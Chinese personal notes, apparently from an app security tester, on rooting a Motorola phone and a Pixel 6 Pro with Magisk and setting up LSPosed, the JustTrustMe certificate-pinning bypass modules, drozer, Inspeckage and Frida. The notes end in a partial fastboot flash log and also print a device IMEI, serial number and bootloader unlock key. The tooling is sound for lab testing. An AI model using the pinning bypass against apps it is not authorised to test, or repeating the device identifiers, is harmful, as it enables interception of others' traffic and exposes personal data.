<p>电脑获取unlock_data </p>
<p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221017215343829.png" alt="image-20221017215343829"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3A25715324260537#5A59323246435A52504B005854323135332D0000#CE1B023F6A41419996033FB2FA351C0AC857A93AF987B17F09E9307F74AF1404#FF648548000000000000000000000000</span><br></pre></td></tr></table></figure>

<p>然后把unlock data 提交到moto</p>
<p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221017215524203.png" alt="image-20221017215524203"></p>
<p>moto 会让你请求unlock key的值，</p>
<p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221017215622346.png" alt="image-20221017215622346"></p>
<p>然后你的邮箱会收到一封解锁码的邮件</p>
<p>X2A4XZK43D65OKRHBA5F</p>
<p>然后下载boot.img</p>
<p><a target="_blank" rel="noopener" href="https://mirrors.lolinet.com/firmware/motorola/pstar_retcn/official/CMCC/">https://mirrors.lolinet.com/firmware/motorola/pstar_retcn/official/CMCC/</a></p>
<p>需要根据你的安卓版本，系统标识 来确定安装 对应的zip 压缩包</p>
<p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221018103413652.png" alt="image-20221018103413652"></p>
<p>然后打开线刷包，把boot.img 文件提取出来，再 adb push 到手机。</p>
<p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221018104501654.png" alt="image-20221018104501654"></p>
<p>然后手机安装Magisk ，官方Github:<a target="_blank" rel="noopener" href="https://github.com/topjohnwu/Magisk/releases">https://github.com/topjohnwu/Magisk/releases</a></p>
<p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221018105221661.png" alt="image-20221018105221661"></p>
<p>安装完了之后，手机打开Magisk， 点击安装，选择一个修补文件，选择之前push 进去的boot.img。</p>
<p>然后在 &#x2F;sdcard&#x2F;Download&#x2F; 中可以看到一个magisk_patch_xx.ing 的文件。</p>
<p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221018105421397.png" alt="image-20221018105421397"></p>
<p>把这两个文件下到本地目录中。</p>
<p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221018105702062.png" alt="image-20221018105702062"></p>
<p>然后adb reboot bootloader，设备会重启，并且卡在bootloader 上。</p>
<p>然后电脑 fastboot flash boot magisk_patched_xxx.img</p>
<p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221018110622689.png" alt="image-20221018110622689"></p>
<p>然后重启</p>
<p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221018111815419.png" alt="image-20221018111815419"></p>
<p>打开magrisk，然后点击直接安装后设备会重启</p>
<p>然后adb  到设备里面，可以看到我们已经是最高的权限了。</p>
<p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221018111750292.png" alt="image-20221018111750292"></p>
<h2 id="安装Xpose-框架"><a href="#安装Xpose-框架" class="headerlink" title="安装Xpose 框架"></a>安装Xpose 框架</h2><p>安装LSPosed  ，LSPosed 是Edxposed 的一个新分支，也是一款开源的GitHub上的Xposed 框架。</p>
<p>LSPosed 基于Riru 的ART 挂钩提供与原版Xposed 相同的API,可以在不修改APK文件的情况下调控程序的运行。</p>
<p>LSPosed开源地址：<a target="_blank" rel="noopener" href="https://github.com/LSPosed/LSPosed/releases">https://github.com/LSPosed/LSPosed/releases</a></p>
<p>adb push LSPosed &#x2F;sdcard&#x2F; 中，然后用magisk 加载这个模块。重启</p>
<p>然后安装JustTrustMe.apk 和 justTrustMePlush-release.apk。然后再LSPosed 中启用这两个模块。</p>
<h2 id="安装-drozer"><a href="#安装-drozer" class="headerlink" title="安装 drozer"></a>安装 drozer</h2><p>见印象笔记 –“10-IOT”– “drozer 安装和使用” 。</p>
<h2 id="安装-Inspeckage"><a href="#安装-Inspeckage" class="headerlink" title="安装 Inspeckage"></a>安装 Inspeckage</h2><p>下载路径(2018) <a target="_blank" rel="noopener" href="https://github.com/ac-pm/Inspeckage/releases">https://github.com/ac-pm/Inspeckage/releases</a></p>
<h2 id="安装Frida"><a href="#安装Frida" class="headerlink" title="安装Frida"></a>安装Frida</h2><p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1100931-1-1.html">https://www.52pojie.cn/thread-1100931-1-1.html</a></p>
<p>pip 安装Frida 和 frida-tools</p>
<p>下载 frida 版本：<a target="_blank" rel="noopener" href="https://pypi.python.org/pypi/frida">https://pypi.python.org/pypi/frida</a></p>
<p>esay_install frida_package.egg</p>
<p>下载 frida-tools : pip install frida-tools -i <a target="_blank" rel="noopener" href="http://pypi.douban.com/simple/">http://pypi.douban.com/simple/</a> –trusted-host pypi.douban.com</p>
<p>运行frida-ps 证明安装成功。</p>
<p>下载手机服务端的frida:  <a target="_blank" rel="noopener" href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a><br>查看手机的指令架构<br><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231228215901605.png"><br>下载<br><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231228215925917.png"></p>
<h3 id="连接Frida"><a href="#连接Frida" class="headerlink" title="连接Frida"></a>连接Frida</h3><p>手机端启动 frida </p>
<p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20230313133800713.png" alt="image-20230313133800713"></p>
<p>client 连接 frida，报错。</p>
<p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20230313133722863.png" alt="image-20230313133722863"></p>
<p>电脑端安装的frida 版本 (可通过 frida –version ) 与adb 传到手机中的 frida-server-版本号-android-arm64不一致。</p>
<p>确保版本一致后。执行 frida-ps -R (查看进程)   和 frida-ps -U ( 检查Usb 设备 )</p>
<p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20230313144026020.png" alt="image-20230313144026020"></p>
<p>问题：测试半天，版本不一致<br><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231224212056166.png"></p>
<h1 id="雷电模拟器"><a href="#雷电模拟器" class="headerlink" title="雷电模拟器"></a>雷电模拟器</h1><p>1.下载模拟器</p>
<p>2.开启root</p>
<p>3.安装xposed，直接把xposed 拖入到模拟器的共享文件夹中安装。</p>
<p><a target="_blank" rel="noopener" href="https://themagisk.com/lsposed/">https://themagisk.com/lsposed/</a></p>
<p>有很多教程，这里没有记录。</p>
<h1 id="Pixel-6p-root"><a href="#Pixel-6p-root" class="headerlink" title="Pixel 6p root"></a>Pixel 6p root</h1><h2 id="Android-13-失败"><a href="#Android-13-失败" class="headerlink" title="Android 13 失败"></a>Android 13 失败</h2><p>Android 版本: 13<br>版本号： TQ1A.230205.002<br>IMEI号 ： 358339773757307</p>
<h3 id="第一步-进入bootloader"><a href="#第一步-进入bootloader" class="headerlink" title="第一步 进入bootloader"></a>第一步 进入bootloader</h3><p>adb reboot bootloader </p>
<h3 id="第二步-解锁bootloader"><a href="#第二步-解锁bootloader" class="headerlink" title="第二步  解锁bootloader"></a>第二步  解锁bootloader</h3><p>先使用fastboot devices 查看是否识别处于fastboot 模式的pixel。</p>
<p>然后 fastboot flashing unlock</p>
<p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205103743301.png"></p>
<h3 id="第三步-下载对应的系统镜像"><a href="#第三步-下载对应的系统镜像" class="headerlink" title="第三步 下载对应的系统镜像"></a>第三步 下载对应的系统镜像</h3><p>官网下载地址： <a target="_blank" rel="noopener" href="https://developers.google.com/android/images?hl=zh-cn">https://developers.google.com/android/images?hl=zh-cn</a></p>
<h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205141725538.png"></p>
<h2 id="android-14"><a href="#android-14" class="headerlink" title="android 14"></a>android 14</h2><h3 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h3><p>开启adb<br>解锁bootloader 为unlock<br>安装magisk</p>
<h3 id="下载镜像文件"><a href="#下载镜像文件" class="headerlink" title="下载镜像文件"></a>下载镜像文件</h3><p><a target="_blank" rel="noopener" href="https://developers.google.com/android/images?hl=zh-cn">https://developers.google.com/android/images?hl=zh-cn</a><br>主要是获取boot.img 文件。<br><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205155937855.png"></p>
<p>操作和moto 的一样。</p>
<p>ps: 如果fastboot boot xxx.img 没有效果，那就重启一下。重新来一次。</p>
<p>进入到magisk  的设置中，打开zygisk 按钮。</p>
<h3 id="安装LSPosed"><a href="#安装LSPosed" class="headerlink" title="安装LSPosed"></a>安装LSPosed</h3><h4 id="加载lsposed"><a href="#加载lsposed" class="headerlink" title="加载lsposed"></a>加载lsposed</h4><p><a target="_blank" rel="noopener" href="https://github.com/LSPosed/LSPosed/releases">https://github.com/LSPosed/LSPosed/releases</a> 下载zygisk 版本的zip<br>然后adb push 到sdcard&#x2F;Download&#x2F; 文件目录中</p>
<p>在magisk 中的模块栏中，添加本地模块，将zip 加载起来。然后重启。<br><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205164828099.png"></p>
<h4 id="安装apk"><a href="#安装apk" class="headerlink" title="安装apk"></a>安装apk</h4><p>安装这个apk</p>
<p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205164753413.png"></p>
<p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205164818870.png"></p>
<h1 id="pixel-6-升级Android14"><a href="#pixel-6-升级Android14" class="headerlink" title="pixel 6 升级Android14"></a>pixel 6 升级Android14</h1><p>旁加载升级</p>
<h2 id="下载OTA镜像"><a href="#下载OTA镜像" class="headerlink" title="下载OTA镜像"></a>下载OTA镜像</h2><p><a target="_blank" rel="noopener" href="https://developers.google.com/android/ota?hl=zh-cn#raven">https://developers.google.com/android/ota?hl=zh-cn#raven</a><br><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205152210071.png"></p>
<h2 id="进入到recover-模式"><a href="#进入到recover-模式" class="headerlink" title="进入到recover 模式"></a>进入到recover 模式</h2><p>输入adb reboot recovery。</p>
<p>然后同事按住电源键 + 音量键提升按钮。</p>
<p>然后跳转到Recovery 清单中。</p>
<h2 id="选择adb升级"><a href="#选择adb升级" class="headerlink" title="选择adb升级"></a>选择adb升级</h2><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205152133161.png"><br>然后会显示<br><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205152303717.png"></p>
<h2 id="sideload-zip"><a href="#sideload-zip" class="headerlink" title="sideload zip"></a>sideload zip</h2><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205145440499.png"></p>
<p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205152409597.jpeg"></p>
<p>升级完成<br><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205151526574.png"></p>
<p>adb reboot 重启</p>
<p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205152605208.jpeg"></p>
<p>参考： <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/660890339">https://zhuanlan.zhihu.com/p/660890339</a></p>
<h1 id="pixel-6P-通过出厂镜像刷机"><a href="#pixel-6P-通过出厂镜像刷机" class="headerlink" title="pixel 6P 通过出厂镜像刷机"></a>pixel 6P 通过出厂镜像刷机</h1><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231222172407700.png"></p>
<p>windows 系统直接运行flash-all.bat<br>运行日志</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line">Sending &#x27;bootloader_b&#x27; (11574 KB)                  OKAY [  0.369s]</span><br><span class="line">Writing &#x27;bootloader_b&#x27;                             (bootloader) Flashing pack version slider-1.2-9152140</span><br><span class="line">(bootloader) flashing platform gs101</span><br><span class="line">(bootloader) Validating partition ufs</span><br><span class="line">(bootloader) Validating partition ufs</span><br><span class="line">(bootloader) Validating partition partition:0</span><br><span class="line">(bootloader) Validating partition partition:1</span><br><span class="line">(bootloader) Validating partition partition:2</span><br><span class="line">(bootloader) Validating partition partition:3</span><br><span class="line">(bootloader) Validating partition bl1_b</span><br><span class="line">(bootloader) Validating partition pbl_b</span><br><span class="line">(bootloader) Validating partition bl2_b</span><br><span class="line">(bootloader) Validating partition abl_b</span><br><span class="line">(bootloader) Validating partition bl31_b</span><br><span class="line">(bootloader) Validating partition tzsw_b</span><br><span class="line">(bootloader) Validating partition gsa_b</span><br><span class="line">(bootloader) Validating partition ldfw_b</span><br><span class="line">(bootloader) Flashing partition ufs</span><br><span class="line">(bootloader) Flashing partition ufs</span><br><span class="line">(bootloader) Flashing partition partition:0</span><br><span class="line">(bootloader) Flashing partition partition:1</span><br><span class="line">(bootloader) Flashing partition partition:2</span><br><span class="line">(bootloader) Flashing partition partition:3</span><br><span class="line">(bootloader) Flashing partition bl1_b</span><br><span class="line">(bootloader) Flashing partition pbl_b</span><br><span class="line">(bootloader) Flashing partition bl2_b</span><br><span class="line">(bootloader) Flashing partition abl_b</span><br><span class="line">(bootloader) Flashing partition bl31_b</span><br><span class="line">(bootloader) Flashing partition tzsw_b</span><br><span class="line">(bootloader) Flashing partition gsa_b</span><br><span class="line">(bootloader) Flashing partition ldfw_b</span><br><span class="line">(bootloader) Loading sideload ufsfwupdate</span><br><span class="line">OKAY [  2.588s]</span><br><span class="line">Finished. Total time: 2.963s</span><br><span class="line">Rebooting into bootloader                          OKAY [  0.000s]</span><br><span class="line">Finished. Total time: 0.002s</span><br><span class="line">&lt; waiting for any device &gt;</span><br><span class="line">Sending &#x27;radio_b&#x27; (94060 KB)                       OKAY [  3.294s]</span><br><span class="line">Writing &#x27;radio_b&#x27;                                  (bootloader) Flashing pack version g5123b-107485-221101-M-9242015</span><br><span class="line">(bootloader) Flashing partition modem_b</span><br><span class="line">OKAY [  0.121s]</span><br><span class="line">Finished. Total time: 3.421s</span><br><span class="line">Rebooting into bootloader                          OKAY [  0.000s]</span><br><span class="line">Finished. Total time: 0.001s</span><br><span class="line">&lt; waiting for any device &gt;</span><br><span class="line">--------------------------------------------</span><br><span class="line">Bootloader Version...: slider-1.2-9152140</span><br><span class="line">Baseband Version.....: g5123b-107485-221101-B-9242015</span><br><span class="line">Serial Number........: 1B231FDEE005T0</span><br><span class="line">--------------------------------------------</span><br><span class="line">extracting android-info.txt (0 MB) to RAM...</span><br><span class="line">Checking &#x27;product&#x27;                                 OKAY [  0.000s]</span><br><span class="line">Checking &#x27;version-bootloader&#x27;                      OKAY [  0.000s]</span><br><span class="line">Checking &#x27;version-baseband&#x27;                        OKAY [  0.000s]</span><br><span class="line">Setting current slot to &#x27;b&#x27;                        OKAY [  0.083s]</span><br><span class="line">extracting boot.img (64 MB) to disk... took 0.294s</span><br><span class="line">archive does not contain &#x27;boot.sig&#x27;</span><br><span class="line">Sending &#x27;boot_b&#x27; (65536 KB)                        OKAY [  2.322s]</span><br><span class="line">Writing &#x27;boot_b&#x27;                                   OKAY [  0.079s]</span><br><span class="line">archive does not contain &#x27;init_boot.img&#x27;</span><br><span class="line">extracting dtbo.img (16 MB) to disk... took 0.048s</span><br><span class="line">archive does not contain &#x27;dtbo.sig&#x27;</span><br><span class="line">Sending &#x27;dtbo_b&#x27; (16384 KB)                        OKAY [  0.524s]</span><br><span class="line">Writing &#x27;dtbo_b&#x27;                                   OKAY [  0.021s]</span><br><span class="line">archive does not contain &#x27;dt.img&#x27;</span><br><span class="line">extracting pvmfw.img (1 MB) to disk... took 0.005s</span><br><span class="line">archive does not contain &#x27;pvmfw.sig&#x27;</span><br><span class="line">Sending &#x27;pvmfw_b&#x27; (1024 KB)                        OKAY [  0.032s]</span><br><span class="line">Writing &#x27;pvmfw_b&#x27;                                  OKAY [  0.003s]</span><br><span class="line">archive does not contain &#x27;recovery.img&#x27;</span><br><span class="line">extracting vbmeta.img (0 MB) to disk... took 0.001s</span><br><span class="line">archive does not contain &#x27;vbmeta.sig&#x27;</span><br><span class="line">Sending &#x27;vbmeta_b&#x27; (12 KB)                         OKAY [  0.001s]</span><br><span class="line">Writing &#x27;vbmeta_b&#x27;                                 OKAY [  0.002s]</span><br><span class="line">extracting vbmeta_system.img (0 MB) to disk... took 0.000s</span><br><span class="line">archive does not contain &#x27;vbmeta_system.sig&#x27;</span><br><span class="line">Sending &#x27;vbmeta_system_b&#x27; (4 KB)                   OKAY [  0.000s]</span><br><span class="line">Writing &#x27;vbmeta_system_b&#x27;                          OKAY [  0.002s]</span><br><span class="line">extracting vbmeta_vendor.img (0 MB) to disk... took 0.001s</span><br><span class="line">archive does not contain &#x27;vbmeta_vendor.sig&#x27;</span><br><span class="line">Sending &#x27;vbmeta_vendor_b&#x27; (4 KB)                   OKAY [  0.000s]</span><br><span class="line">Writing &#x27;vbmeta_vendor_b&#x27;                          OKAY [  0.002s]</span><br><span class="line">extracting vendor_boot.img (64 MB) to disk... took 0.439s</span><br><span class="line">archive does not contain &#x27;vendor_boot.sig&#x27;</span><br><span class="line">Sending &#x27;vendor_boot_b&#x27; (65536 KB)                 OKAY [  2.079s]</span><br><span class="line">Writing &#x27;vendor_boot_b&#x27;                            OKAY [  0.077s]</span><br><span class="line">archive does not contain &#x27;vendor_kernel_boot.img&#x27;</span><br><span class="line">extracting super_empty.img (0 MB) to disk... took 0.000s</span><br><span class="line">Rebooting into fastboot                            OKAY [  0.000s]</span><br><span class="line">&lt; waiting for any device &gt;</span><br><span class="line">Sending &#x27;super&#x27; (4 KB)                             OKAY [  0.001s]</span><br><span class="line">Updating super partition                           OKAY [  0.019s]</span><br><span class="line">Resizing &#x27;product_b&#x27;                               OKAY [  0.003s]</span><br><span class="line">Resizing &#x27;system_b&#x27;                                OKAY [  0.003s]</span><br><span class="line">Resizing &#x27;system_ext_b&#x27;                            OKAY [  0.003s]</span><br><span class="line">Resizing &#x27;system_a&#x27;                                OKAY [  0.003s]</span><br><span class="line">Resizing &#x27;vendor_b&#x27;                                OKAY [  0.003s]</span><br><span class="line">Resizing &#x27;vendor_dlkm_b&#x27;                           OKAY [  0.002s]</span><br><span class="line">Resizing &#x27;vendor_a&#x27;                                OKAY [  0.003s]</span><br><span class="line">archive does not contain &#x27;boot_other.img&#x27;</span><br><span class="line">archive does not contain &#x27;odm.img&#x27;</span><br><span class="line">archive does not contain &#x27;odm_dlkm.img&#x27;</span><br><span class="line">extracting product.img (2588 MB) to disk... took 17.016s</span><br><span class="line">Invalid sparse file format at header magic</span><br><span class="line">archive does not contain &#x27;product.sig&#x27;</span><br><span class="line">Resizing &#x27;product_b&#x27;                               OKAY [  0.006s]</span><br><span class="line">Sending sparse &#x27;product_b&#x27; 1/11 (262112 KB)        OKAY [  8.788s]</span><br><span class="line">Writing &#x27;product_b&#x27;                                OKAY [  0.321s]</span><br><span class="line">Sending sparse &#x27;product_b&#x27; 2/11 (262124 KB)        OKAY [  8.759s]</span><br><span class="line">Writing &#x27;product_b&#x27;                                OKAY [  0.327s]</span><br><span class="line">Sending sparse &#x27;product_b&#x27; 3/11 (262128 KB)        OKAY [  8.752s]</span><br><span class="line">Writing &#x27;product_b&#x27;                                OKAY [  0.338s]</span><br><span class="line">Sending sparse &#x27;product_b&#x27; 4/11 (262116 KB)        OKAY [  8.779s]</span><br><span class="line">Writing &#x27;product_b&#x27;                                OKAY [  0.331s]</span><br><span class="line">Sending sparse &#x27;product_b&#x27; 5/11 (262120 KB)        OKAY [  8.814s]</span><br><span class="line">Writing &#x27;product_b&#x27;                                OKAY [  0.331s]</span><br><span class="line">Sending sparse &#x27;product_b&#x27; 6/11 (262124 KB)        OKAY [  8.867s]</span><br><span class="line">Writing &#x27;product_b&#x27;                                OKAY [  0.340s]</span><br><span class="line">Sending sparse &#x27;product_b&#x27; 7/11 (262124 KB)        OKAY [  8.819s]</span><br><span class="line">Writing &#x27;product_b&#x27;                                OKAY [  0.304s]</span><br><span class="line">Sending sparse &#x27;product_b&#x27; 8/11 (262128 KB)        OKAY [  8.894s]</span><br><span class="line">Writing &#x27;product_b&#x27;                                OKAY [  0.340s]</span><br><span class="line">Sending sparse &#x27;product_b&#x27; 9/11 (262128 KB)        OKAY [  8.803s]</span><br><span class="line">Writing &#x27;product_b&#x27;                                OKAY [  0.356s]</span><br><span class="line">Sending sparse &#x27;product_b&#x27; 10/11 (241248 KB)       OKAY [  8.124s]</span><br><span class="line">Writing &#x27;product_b&#x27;                                OKAY [  0.368s]</span><br><span class="line">Sending sparse &#x27;product_b&#x27; 11/11 (41336 KB)        OKAY [  1.400s]</span><br><span class="line">Writing &#x27;product_b&#x27;                                OKAY [  0.104s]</span><br><span class="line">extracting system.img (840 MB) to disk... took 5.310s</span><br><span class="line">Invalid sparse file format at header magic</span><br><span class="line">archive does not contain &#x27;system.sig&#x27;</span><br><span class="line">Resizing &#x27;system_b&#x27;                                OKAY [  0.006s]</span><br><span class="line">Sending sparse &#x27;system_b&#x27; 1/4 (262116 KB)          OKAY [  8.625s]</span><br><span class="line">Writing &#x27;system_b&#x27;                                 OKAY [  0.339s]</span><br><span class="line">Sending sparse &#x27;system_b&#x27; 2/4 (262120 KB)          OKAY [  8.675s]</span><br><span class="line">Writing &#x27;system_b&#x27;                                 OKAY [  0.318s]</span><br><span class="line">Sending sparse &#x27;system_b&#x27; 3/4 (262140 KB)          OKAY [  8.607s]</span><br><span class="line">Writing &#x27;system_b&#x27;                                 OKAY [  0.374s]</span><br><span class="line">Sending sparse &#x27;system_b&#x27; 4/4 (71380 KB)           OKAY [  2.356s]</span><br><span class="line">Writing &#x27;system_b&#x27;                                 OKAY [  0.147s]</span><br><span class="line">archive does not contain &#x27;system_dlkm.img&#x27;</span><br><span class="line">extracting system_ext.img (353 MB) to disk... took 2.108s</span><br><span class="line">Invalid sparse file format at header magic</span><br><span class="line">archive does not contain &#x27;system_ext.sig&#x27;</span><br><span class="line">Resizing &#x27;system_ext_b&#x27;                            OKAY [  0.007s]</span><br><span class="line">Sending sparse &#x27;system_ext_b&#x27; 1/2 (262140 KB)      OKAY [  8.655s]</span><br><span class="line">Writing &#x27;system_ext_b&#x27;                             OKAY [  0.329s]</span><br><span class="line">Sending sparse &#x27;system_ext_b&#x27; 2/2 (99100 KB)       OKAY [  3.283s]</span><br><span class="line">Writing &#x27;system_ext_b&#x27;                             OKAY [  0.166s]</span><br><span class="line">extracting system_other.img (24 MB) to disk... took 0.157s</span><br><span class="line">archive does not contain &#x27;system.sig&#x27;</span><br><span class="line">Resizing &#x27;system_a&#x27;                                OKAY [  0.006s]</span><br><span class="line">Sending &#x27;system_a&#x27; (25220 KB)                      OKAY [  0.825s]</span><br><span class="line">Writing &#x27;system_a&#x27;                                 OKAY [  0.103s]</span><br><span 